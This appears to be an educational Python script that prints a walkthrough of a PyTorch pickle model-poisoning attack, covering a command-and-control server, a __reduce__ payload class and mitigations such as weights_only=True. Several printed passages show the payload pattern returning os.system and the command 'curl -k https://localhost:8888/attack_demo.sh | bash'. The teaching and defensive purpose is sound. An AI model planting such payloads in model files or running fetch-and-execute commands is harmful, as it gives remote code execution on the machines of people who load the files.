#!/usr/bin/env python3
"""
Attack Chain Analysis - Educational Tool
=========================================
This script analyzes the complete attack chain to help students understand
how PyTorch model poisoning attacks work.

Analysis Flow:
    0_server.py      â†’ CnC Server (Command & Control)
    1_attack.py      â†’ Malicious Model Creation
    2_victim-load.py â†’ Victim Loading Model
    serverlog.txt    â†’ Attack Success Evidence

Key Concepts Explained:
    - Pickle deserialization vulnerability
    - __reduce__() magic method exploitation
    - CnC (Command & Control) server communication
    - Remote Code Execution (RCE)
"""

import os
import pickle
import torch
import re
from datetime import datetime


# ============================================================================
# Configuration
# ============================================================================

NORMAL_MODEL = 'models/small_model.pt'
MALICIOUS_MODEL = 'models_attack/small_normal_malicious.pt'
SERVER_LOG = 'data/serverlog.txt'


# ============================================================================
# Analysis Functions
# ============================================================================

def print_header(title):
    """Print formatted section header"""
    print("\n" + "=" * 80)
    print(f" {title}")
    print("=" * 80)


def print_step(step_num, title):
    """Print step header"""
    print(f"\n{'â”€' * 80}")
    print(f"STEP {step_num}: {title}")
    print('â”€' * 80)


def analyze_attack_chain():
    """Main analysis function - explains the complete attack chain"""

    print("=" * 80)
    print(" PYTORCH MODEL POISONING - ATTACK CHAIN ANALYSIS")
    print(" Educational Tool for Understanding Pickle Vulnerabilities")
    print("=" * 80)

    print("\nğŸ“š LEARNING OBJECTIVES:")
    print("   1. Understand pickle deserialization vulnerability")
    print("   2. Learn how __reduce__() enables code execution")
    print("   3. See real CnC (Command & Control) communication")
    print("   4. Recognize signs of model poisoning attacks")

    # ========================================================================
    # STEP 0: Attack Chain Overview
    # ========================================================================
    print_header("ATTACK CHAIN OVERVIEW")

    print("""
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚ 0_server.py â”‚      â”‚ 1_attack.py â”‚      â”‚ 2_victim.py â”‚      â”‚serverlog.txtâ”‚
    â”‚  (CnC Server)â”‚ â†â”€â”€â†’ â”‚  (Attacker) â”‚ â”€â”€â”€â†’ â”‚   (Victim)  â”‚ â”€â”€â”€â†’ â”‚  (Evidence) â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â†‘                     â†“                     â†“                     â†“
    Port 8888          Inject Payload        torch.load()         Attack Success!

    Attack Flow:
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    1. Attacker sets up CnC server (0_server.py) on port 8888
    2. Attacker injects malicious payload into model (1_attack.py)
    3. Victim downloads and loads poisoned model (2_victim-load.py)
    4. Payload executes: curl -k https://localhost:8888/attack_demo.sh | bash
    5. Server logs the successful attack (serverlog.txt)
    """)

    # ========================================================================
    # STEP 1: CnC Server Analysis
    # ========================================================================
    print_step(1, "CnC (Command & Control) Server Analysis")

    print("""
    ğŸ“– What is a CnC Server?
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    A Command & Control server is used by attackers to:
    - Distribute malicious payloads
    - Receive stolen data from compromised systems
    - Issue commands to infected machines

    In this demo:
    - File: 0_server.py
    - Port: 8888
    - Serves: attack_demo.sh (malicious script)
    - Logs: All connection attempts
    """)

    if os.path.exists('0_server.py'):
        with open('0_server.py', 'r') as f:
            content = f.read()
            # Find the handler for attack_demo.sh
            if 'attack_demo.sh' in content:
                print("   âœ“ Server configured to serve attack_demo.sh")
                print("   âœ“ Listens on port 8888")
                print("   âœ“ Logs all download attempts")
    else:
        print("   âš  Warning: 0_server.py not found")

    # ========================================================================
    # STEP 2: Pickle Vulnerability & __reduce__()
    # ========================================================================
    print_step(2, "Understanding Pickle Vulnerability")

    print("""
    ğŸ“– What is Pickle?
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    Pickle is Python's serialization format. It converts Python objects to bytes
    and back. PyTorch uses pickle to save/load models (.pt files).

    ğŸ“– The __reduce__() Vulnerability
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    When pickle deserializes (unpickles) an object, it calls __reduce__() if defined.
    Attackers abuse this to execute arbitrary code!

    Normal object:        class Model: ...
    Malicious object:     class Payload:
                              def __reduce__(self):
                                  return (os.system, ('malicious_command',))

    When unpickled â†’ os.system('malicious_command') EXECUTES AUTOMATICALLY!
    """)

    print("\n   ğŸ” Analyzing 1_attack.py - Payload Injection")
    print("   " + "â”€" * 76)

    if os.path.exists('1_attack.py'):
        with open('1_attack.py', 'r') as f:
            content = f.read()

            # Extract MaliciousPayload class
            if 'class MaliciousPayload' in content:
                print("   âœ“ Found MaliciousPayload class definition")

                # Find __reduce__ method
                reduce_match = re.search(r'def __reduce__\(self\):.*?return.*?\)', content, re.DOTALL)
                if reduce_match:
                    print("\n   ğŸš¨ MALICIOUS CODE DETECTED:")
                    print("   " + "â”€" * 76)
                    for line in reduce_match.group(0).split('\n'):
                        print(f"      {line}")
                    print("   " + "â”€" * 76)

                # Find curl command
                curl_match = re.search(r'curl -s (http://[^\)]+)', content)
                if curl_match:
                    cnc_url = curl_match.group(1)
                    print(f"\n   ğŸ¯ CnC Server URL: {cnc_url}")
                    print(f"   ğŸ“¡ Command: Downloads and executes attack_demo.sh")
    else:
        print("   âš  Warning: 1_attack.py not found")

    print("""
    ğŸ’¡ How the Payload Works:
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    1. Attacker defines MaliciousPayload with __reduce__()
    2. __reduce__() returns: (os.system, ('curl -k https://localhost:8888/... | bash',))
    3. When pickle unpickles this object:
       â†’ It calls: os.system('curl -k https://localhost:8888/attack_demo.sh | bash')
       â†’ Downloads attack_demo.sh from CnC server
       â†’ Executes it with bash
       â†’ REMOTE CODE EXECUTION achieved! ğŸš¨
    """)

    # ========================================================================
    # STEP 3: Model File Analysis
    # ========================================================================
    print_step(3, "Comparing Normal vs Malicious Models")

    print("""
    ğŸ“– Model File Comparison
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    We'll compare the normal model with the poisoned model to see the difference.
    """)

    if os.path.exists(NORMAL_MODEL) and os.path.exists(MALICIOUS_MODEL):
        normal_size = os.path.getsize(NORMAL_MODEL)
        malicious_size = os.path.getsize(MALICIOUS_MODEL)
        overhead = malicious_size - normal_size

        print(f"\n   Normal Model:    {NORMAL_MODEL}")
        print(f"      Size: {normal_size:,} bytes ({normal_size / (1024*1024):.2f} MB)")

        print(f"\n   Malicious Model: {MALICIOUS_MODEL}")
        print(f"      Size: {malicious_size:,} bytes ({malicious_size / (1024*1024):.2f} MB)")

        print(f"\n   Payload Overhead: {overhead:,} bytes ({overhead / 1024:.2f} KB)")
        print(f"   Overhead %: {(overhead / normal_size) * 100:.4f}%")

        print("\n   ğŸ’¡ Analysis:")
        if overhead < 5000:
            print("      â€¢ Very small overhead - hard to detect by file size alone!")
            print("      â€¢ Attackers can hide malicious code in large models")

        # Try to safely inspect the malicious model structure
        print("\n   ğŸ” Inspecting Malicious Model Structure (SAFELY):")
        print("   " + "â”€" * 76)

        try:
            # Load with weights_only=True to prevent execution
            print("      Loading with weights_only=True (safe mode)...")
            print("      Note: This may fail if malicious payload is incompatible")

            # Instead, let's examine the pickle structure without executing
            with open(MALICIOUS_MODEL, 'rb') as f:
                # Read magic number
                magic = f.read(4)
                print(f"      Magic bytes: {magic.hex()}")

            print("\n      âš  Full analysis requires execution - DANGEROUS!")
            print("      âš  That's what 2_victim-load.py demonstrates")

        except Exception as e:
            print(f"      Error during safe analysis: {e}")
    else:
        print("   âš  Model files not found")
        if not os.path.exists(NORMAL_MODEL):
            print(f"      Missing: {NORMAL_MODEL}")
        if not os.path.exists(MALICIOUS_MODEL):
            print(f"      Missing: {MALICIOUS_MODEL}")
            print(f"      Run: python3 1_attack.py")

    # ========================================================================
    # STEP 4: Victim Analysis
    # ========================================================================
    print_step(4, "Victim Loading Process")

    print("""
    ğŸ“– The Victim's Mistake
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    File: 2_victim-load.py

    Vulnerable Code:
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        model = torch.load('malicious_model.pt', weights_only=False)
                                                  ^^^^^^^^^^^^^^^^^^^^
                                                  DANGEROUS!

    What Happens:
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    1. torch.load() reads the .pt file
    2. Pickle deserializes the model data
    3. Encounters MaliciousPayload object
    4. Calls __reduce__() automatically
    5. Executes: os.system('curl -k https://localhost:8888/attack_demo.sh | bash')
    6. Downloads attack_demo.sh from CnC server
    7. Executes the script â†’ SYSTEM COMPROMISED! ğŸš¨

    Timeline:
    â”€â”€â”€â”€â”€â”€â”€â”€
    [0.000s] User runs: python3 2_victim-load.py
    [0.100s] torch.load() starts deserializing
    [0.150s] __reduce__() triggered
    [0.200s] curl connects to localhost:8888
    [0.250s] attack_demo.sh downloaded
    [0.300s] bash executes the script
    [0.350s] "Your device is hacked" displayed
    [0.400s] CnC server logs successful attack
    """)

    # ========================================================================
    # STEP 5: Server Log Analysis
    # ========================================================================
    print_step(5, "CnC Server Log Analysis")

    print("""
    ğŸ“– Evidence of Attack Success
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    The CnC server logs every connection attempt. Let's check if the attack succeeded.
    """)

    if os.path.exists(SERVER_LOG):
        print(f"\n   ğŸ“„ Reading server log: {SERVER_LOG}")
        print("   " + "â”€" * 76)

        with open(SERVER_LOG, 'r') as f:
            log_content = f.read()

        if log_content.strip():
            print("\n   ğŸ“‹ Server Log Contents:")
            print("   " + "â”€" * 76)
            for line in log_content.split('\n'):
                if line.strip():
                    print(f"      {line}")
            print("   " + "â”€" * 76)

            # Analyze log entries
            print("\n   ğŸ” Log Analysis:")
            if 'Attack Succeed' in log_content or 'attack_demo.sh' in log_content:
                print("      ğŸš¨ ATTACK SUCCESSFUL!")
                print("      â€¢ CnC server received connection")
                print("      â€¢ attack_demo.sh was downloaded")
                print("      â€¢ Victim system executed malicious payload")

                # Extract timestamp if available
                timestamp_match = re.search(r'\[([\d\-: ]+)\]', log_content)
                if timestamp_match:
                    print(f"      â€¢ Attack time: {timestamp_match.group(1)}")

                # Extract IP if available
                ip_match = re.search(r'from ([\d\.]+)', log_content)
                if ip_match:
                    print(f"      â€¢ Source IP: {ip_match.group(1)}")
            else:
                print("      â„¹ No attack logged yet")
                print("      â€¢ Server is running but no victim connected")
                print("      â€¢ Run: python3 2_victim-load.py")
        else:
            print("\n      â„¹ Server log is empty")
            print("      â€¢ CnC server running but no connections yet")
            print("      â€¢ Run: python3 2_victim-load.py to trigger attack")
    else:
        print(f"\n   âš  Server log not found: {SERVER_LOG}")
        print("      â€¢ Start server: python3 -u 0_server.py 2>&1 | tee data/serverlog.txt")
        print("      â€¢ Then run: python3 2_victim-load.py")

    # ========================================================================
    # STEP 6: Defense & Mitigation
    # ========================================================================
    print_step(6, "Defense & Mitigation Strategies")

    print("""
    ğŸ›¡ï¸ How to Protect Against This Attack
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    1. Use weights_only=True (PyTorch 2.0+):
       âœ… model = torch.load('model.pt', weights_only=True)
       â€¢ Only loads tensor data, blocks arbitrary code
       â€¢ Safest option for untrusted models

    2. Verify Model Signatures (This Project!):
       âœ… Use self-verifying models with ML-DSA-44 signatures
       â€¢ Cryptographically sign models before distribution
       â€¢ Verify signature before loading
       â€¢ See: self_verifying_secure.py

    3. Sandboxing:
       âœ… Load untrusted models in isolated environments
       â€¢ Docker containers
       â€¢ Virtual machines
       â€¢ Restricted user accounts

    4. Code Review:
       âœ… Inspect model source before loading
       â€¢ Check where models came from
       â€¢ Verify checksums/hashes
       â€¢ Only trust official sources

    5. Network Monitoring:
       âœ… Detect suspicious outbound connections
       â€¢ Monitor for unexpected curl/wget
       â€¢ Block unknown CnC servers
       â€¢ Use firewall rules
    """)

    # ========================================================================
    # Summary
    # ========================================================================
    print_header("SUMMARY - COMPLETE ATTACK CHAIN")

    print("""
    ğŸ“Š Attack Chain Summary
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚ Component         â”‚ Role              â”‚ Key Technique                â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚ 0_server.py       â”‚ CnC Server        â”‚ HTTP server on port 8888     â”‚
    â”‚ 1_attack.py       â”‚ Payload Injection â”‚ __reduce__() exploitation    â”‚
    â”‚ 2_victim-load.py  â”‚ Trigger           â”‚ torch.load(weights_only=False)â”‚
    â”‚ serverlog.txt     â”‚ Evidence          â”‚ Logs successful connections  â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

    ğŸ”‘ Key Takeaways for Students:
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    1. Pickle Vulnerability:
       â€¢ Python's pickle is NOT safe for untrusted data
       â€¢ __reduce__() method enables arbitrary code execution
       â€¢ PyTorch models use pickle â†’ vulnerable by default

    2. Attack Mechanism:
       â€¢ Attacker injects MaliciousPayload object into model
       â€¢ __reduce__() returns (function, args) tuple
       â€¢ When unpickled, function(*args) executes automatically
       â€¢ No user interaction needed - just loading triggers it!

    3. CnC Communication:
       â€¢ Malicious payload connects to attacker's server
       â€¢ Downloads and executes additional malware
       â€¢ Can exfiltrate data, install backdoors, etc.

    4. Defense:
       â€¢ ALWAYS use weights_only=True for untrusted models
       â€¢ Implement cryptographic verification (ML-DSA signatures)
       â€¢ Never load models from unknown sources
       â€¢ Monitor network activity for suspicious connections

    5. Real-World Impact:
       â€¢ Model repositories (HuggingFace, etc.) can be compromised
       â€¢ Pre-trained models may contain hidden malware
       â€¢ Supply chain attacks targeting ML practitioners
       â€¢ Critical infrastructure using AI models at risk
    """)

    print("\n" + "=" * 80)
    print(" End of Analysis - Stay Safe! ğŸ›¡ï¸")
    print("=" * 80)
    print()


# ============================================================================
# Main
# ============================================================================

if __name__ == "__main__":
    analyze_attack_chain()
